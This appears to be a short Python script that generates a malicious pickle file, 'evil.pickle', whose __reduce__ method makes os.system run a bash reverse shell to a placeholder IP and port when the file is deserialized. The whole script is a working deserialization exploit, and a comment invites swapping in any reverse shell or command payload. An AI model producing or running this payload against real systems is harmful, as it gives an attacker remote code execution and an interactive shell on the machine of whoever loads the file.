import pickle
import os

class RCE:
    def __reduce__(self):
        # Replace with your reverse shell or command payload
        cmd = ("bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'",)
        return os.system, cmd

payload = pickle.dumps(RCE())
with open("evil.pickle", "wb") as f:
    f.write(payload)
